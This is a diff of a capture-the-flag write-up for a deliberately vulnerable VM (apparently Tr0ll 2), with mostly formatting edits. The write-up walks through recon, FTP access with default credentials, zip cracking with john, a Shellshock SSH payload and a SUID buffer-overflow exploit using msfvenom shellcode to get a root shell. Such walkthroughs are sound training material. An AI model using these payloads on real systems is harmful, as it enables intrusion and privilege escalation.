@@ -7,7 +7,7 @@
 
 ## Recon
 
-1. I identified the target host on the local subnet and performed full TCP service enumeration.
+I identified the target host on the local subnet and performed full TCP service enumeration.
 
 ```bash
 └─$ cat arp-scan.txt
@@ -57,7 +57,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 22.94 seconds
 ```
 
-2. I perfomed a directory enumeration to find common subdirectories
+I perfomed a directory enumeration to find common subdirectories
 
 ```bash
 gobuster dir -url http://192.168.1.128/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
@@ -83,7 +83,7 @@ Finished
 ===============================================================
 ```
 
-3. Obtained the robots file
+Obtained the robots file
 
 ```bash
 curl -s "http://192.168.1.128/robots"
@@ -110,7 +110,7 @@ curl -s "http://192.168.1.128/robots"
 /seriously_stop
 ```
 
-4. Retried directory enumeration but now with the new subdirectories found
+Retried directory enumeration but now with the new subdirectories found
 
 ```bash
 gobuster dir -url http://192.168.1.128/ -w 4.robots.txt
@@ -137,11 +137,11 @@ Finished
 ===============================================================
 ```
 
-Found several fotos. Index had the only distinct one.
+Found several fotos. Index had the only distinct one.  
 <img width="241" height="240" alt="imagem" src="https://github.com/user-attachments/assets/eed24201-5b86-4b65-92bf-b86728c1a97e" />
 <img width="437" height="264" alt="imagem" src="https://github.com/user-attachments/assets/69afb184-2c72-4d28-adf4-c2d3ce53355a" />
 
-So I checked for strings around the images on all the above directories and found on dont_bother:
+So I checked for strings around the images on all the above directories and found on dont_bother:  
 
 ```bash
 @Si;X'
@@ -156,11 +156,12 @@ lj\p
 Look Deep within y0ur_self for the answer
 ```
 
-which lead to another website
+which lead to another website  
 
-<img width="810" height="434" alt="imagem" src="https://github.com/user-attachments/assets/55e6bd2b-8cb7-47da-a51d-606ecd4a4fc7" />
+<img width="810" height="434" alt="imagem" src="https://github.com/user-attachments/assets/55e6bd2b-8cb7-47da-a51d-606ecd4a4fc7" />  
 
-proceeded to download the file & checked index for clues
+proceeded to download the file & checked index for clues  
+
 ``` bash
 curl -s "http://192.168.1.128/y0ur_self/answer.txt" | tee answer.txt
 curl -s "http://192.168.1.128/"
@@ -172,77 +173,77 @@ curl -s "http://192.168.1.128/"
 <!--Editor: VIM>
 ```
 
-The file had a base64 enconding which was reversed with:
+The file had a base64 enconding which was reversed with:  
 
 ``` bash
 base64 -d 8.answer.txt > 9.answer_decoded.txt
 ```
 
-Then I tried to get into ftp using username: Tr0ll and Password: Tr0ll
+Then I tried to get into ftp using username: Tr0ll and Password: Tr0ll  
 
 ``` bash
 ftp 192.168.1.128
 ```
 
-<img width="567" height="355" alt="imagem" src="https://github.com/user-attachments/assets/f6a00313-fe5d-4c5a-abd3-4679dc2ac367" />
+<img width="567" height="355" alt="imagem" src="https://github.com/user-attachments/assets/f6a00313-fe5d-4c5a-abd3-4679dc2ac367" />  
+ 
+This lead me to a zip file with a password  
 
-This lead me to a zip file with a password
+<img width="391" height="151" alt="imagem" src="https://github.com/user-attachments/assets/46ae060d-7c71-4919-bdb8-adae36251ad8" />  
 
-<img width="391" height="151" alt="imagem" src="https://github.com/user-attachments/assets/46ae060d-7c71-4919-bdb8-adae36251ad8" />
-
-The next step was hashing the zip so we could bruteforce it with the decoded base64 file we just got
-
-``` bash
-zip2john lmao.zip > 11.lmao.hash
-john -wordlist:9.answer_decoded.txt 11.lmao.hash
-```
-
-A match was found which would likely unzip the file
-
-<img width="546" height="221" alt="imagem" src="https://github.com/user-attachments/assets/7d6dc97b-0b7c-4f2b-b22d-a0952e459050" />
+The next step was hashing the zip so we could bruteforce it with the decoded base64 file we just got  
 
 ``` bash
 zip2john lmao.zip > 11.lmao.hash
 john -wordlist:9.answer_decoded.txt 11.lmao.hash
 ```
 
-<img width="554" height="561" alt="imagem" src="https://github.com/user-attachments/assets/3640fc42-30b9-4bf9-993c-4c59fefcd247" />
+A match was found which would likely unzip the file  
 
-So with this new RSA key we could try to login into SSH with username: noob
+<img width="546" height="221" alt="imagem" src="https://github.com/user-attachments/assets/7d6dc97b-0b7c-4f2b-b22d-a0952e459050" />  
+
+``` bash
+zip2john lmao.zip > 11.lmao.hash
+john -wordlist:9.answer_decoded.txt 11.lmao.hash
+```
+
+<img width="554" height="561" alt="imagem" src="https://github.com/user-attachments/assets/3640fc42-30b9-4bf9-993c-4c59fefcd247" />  
+
+So with this new RSA key we could try to login into SSH with username: noob  
 
 ``` bash
 ssh -o PubkeyAcceptedAlgorithms=+ssh-rsa -i noob noob@192.168.1.128
 ```
 
-<img width="465" height="179" alt="imagem" src="https://github.com/user-attachments/assets/8107ac0c-2894-4ee6-b306-027af7755f7a" />
+<img width="465" height="179" alt="imagem" src="https://github.com/user-attachments/assets/8107ac0c-2894-4ee6-b306-027af7755f7a" />  
 
-This failed, however we could try the shellshock exploit since this VM was upload during that time
+This failed, however we could try the shellshock exploit since this VM was upload during that time  
 
 ``` bash
 ssh -o PubkeyAcceptedAlgorithms=+ssh-rsa -i noob -t noob@192.168.1.128 "() { :;}; /bin/bash"
 ```
 
-<img width="575" height="216" alt="imagem" src="https://github.com/user-attachments/assets/7ad0654d-0487-4b81-b23a-e35332c41502" />
+<img width="575" height="216" alt="imagem" src="https://github.com/user-attachments/assets/7ad0654d-0487-4b81-b23a-e35332c41502" />  
 
-Now that we have access, we can explore. No luck on normal directories such has /opt, /tmp or others. Therefore the next step was looking for known CVEs for this machine's version
+Now that we have access, we can explore. No luck on normal directories such has /opt, /tmp or others. Therefore the next step was looking for known CVEs for this machine's version  
 
-<img width="572" height="473" alt="imagem" src="https://github.com/user-attachments/assets/7f3b1a5a-9c0a-4d4c-a7ea-6a5e992fe842" />
+<img width="572" height="473" alt="imagem" src="https://github.com/user-attachments/assets/7f3b1a5a-9c0a-4d4c-a7ea-6a5e992fe842" />  
 
-After looking around on searchploit and exploitdb and even trying a few, at the best of my knowledge I couldn't get a priveledge escalation CVE to work.
+After looking around on searchploit and exploitdb and even trying a few, at the best of my knowledge I couldn't get a priveledge escalation CVE to work.  
 
-I tried checking directories and found some interesting stuff:
+I tried checking directories and found some interesting stuff:  
 
-<img width="574" height="580" alt="imagem" src="https://github.com/user-attachments/assets/a6ca778a-93b8-4268-ab1c-32fc60227efc" />
+<img width="574" height="580" alt="imagem" src="https://github.com/user-attachments/assets/a6ca778a-93b8-4268-ab1c-32fc60227efc" />  
 
-Some folders with executables in them. And to make things better some of them had the SUID bit on, which means that if we can hijack the process we have root priveledge to execute whatever command we inject the process with.
+Some folders with executables in them. And to make things better some of them had the SUID bit on, which means that if we can hijack the process we have root priveledge to execute whatever command we inject the process with.  
 
-After sometime I noticed that the executables move around directories, which means we had to check them periodically. After disassembling the main function we could find a strcpy function:
+After sometime I noticed that the executables move around directories, which means we had to check them periodically. After disassembling the main function we could find a strcpy function:  
 
-<img width="495" height="563" alt="imagem" src="https://github.com/user-attachments/assets/9ab4a328-a09c-4e44-a159-6cb3062d9212" />
+<img width="495" height="563" alt="imagem" src="https://github.com/user-attachments/assets/9ab4a328-a09c-4e44-a159-6cb3062d9212" />  
 
-Which is exactly what we want and need to hijack the process.
+Which is exactly what we want and need to hijack the process.  
 
-With a few help from msfvenom we can craft a fast payload to check for bufferoverflow offsets
+With a few help from msfvenom we can craft a fast payload to check for bufferoverflow offsets  
 
 ```bash
 msf-pattern_create -l 300
@@ -250,29 +251,31 @@ msf-pattern_offset -q 0x6a413969
 python -c 'print "A"*268 + "B"*4 + "\x90"*150' > /tmp/payload
 ```
 
-<img width="572" height="576" alt="imagem" src="https://github.com/user-attachments/assets/d7f2e856-d364-4992-9892-e7ec5f7d21a7" />
+<img width="572" height="576" alt="imagem" src="https://github.com/user-attachments/assets/d7f2e856-d364-4992-9892-e7ec5f7d21a7" />  
 
-We found that the EIP address has value 0x6a413969 which corresponds to a 268 byte offset
+We found that the EIP address has value 0x6a413969 which corresponds to a 268 byte offset  
 
-<img width="527" height="494" alt="imagem" src="https://github.com/user-attachments/assets/2adb62e4-1603-490e-b005-dc16e335248a" />
+<img width="527" height="494" alt="imagem" src="https://github.com/user-attachments/assets/2adb62e4-1603-490e-b005-dc16e335248a" />  
 
-We can validade that after sending python -c 'print "A"*268 + "B"*4 + "\x90"*150' as input, now the EIP has 0x42424242 which corresponds to 4 * B
+We can validade that after sending python -c 'print "A"*268 + "B"*4 + "\x90"*150' as input, now the EIP has 0x42424242 which corresponds to 4 * B  
 
-This means that our offset calculations were correct and now we can hijack the process. We can achieve this by changing the EIP value to another register. This register will be chosen carefully to guarantee the CPU's intructions end up were we want them to. The \x90 value represents a NoOp, which means the CPU skips this intructions and reads the next.
+This means that our offset calculations were correct and now we can hijack the process. We can achieve this by changing the EIP value to another register.  
 
-A NoOp sled is when we inject a set of NoOps into the CPU eventually leading to a carefully crafted payload which contains intructions of a command to execute. This ensures that we have a margin for dynamic stack changes.
+This register will be chosen carefully to guarantee the CPU's intructions end up were we want them to. The \x90 value represents a NoOp, which means the CPU skips this intructions and reads the next.  
 
-<img width="508" height="566" alt="imagem" src="https://github.com/user-attachments/assets/8ce59d5b-8d8b-49fe-9948-a0bd8d57d4d5" />
+A NoOp sled is when we inject a set of NoOps into the CPU eventually leading to a carefully crafted payload which contains intructions of a command to execute. This ensures that we have a margin for dynamic stack changes.  
 
-The only thing remaining is setting our EIP to an address that contains the \x90 values. Any would do.
+<img width="508" height="566" alt="imagem" src="https://github.com/user-attachments/assets/8ce59d5b-8d8b-49fe-9948-a0bd8d57d4d5" />  
 
-We use msfvenom once again to craft in hex the command we want to run
+The only thing remaining is setting our EIP to an address that contains the \x90 values. Any would do.  
+
+We use msfvenom once again to craft in hex the command we want to run  
 
 ```bash
 msfvenom -p linux/x86/exec -f python CMD="/bin/sh" -b '\x00'
 ```
 
-Then we execute a payload I designed
+Then we execute a payload I designed  
 
 ```bash
 #!/usr/bin/env python
@@ -326,8 +329,8 @@ payload = "A" * padding_size + return_addr + nops + shellcode
 print payload
 ```
 
-And we run it as input for the executable
+And we run it as input for the executable   
 
-<img width="539" height="268" alt="imagem" src="https://github.com/user-attachments/assets/88a7b5b5-e8d4-43a2-84cd-5af65dae72d3" />
+<img width="539" height="268" alt="imagem" src="https://github.com/user-attachments/assets/88a7b5b5-e8d4-43a2-84cd-5af65dae72d3" />  
 
 And there we go. 
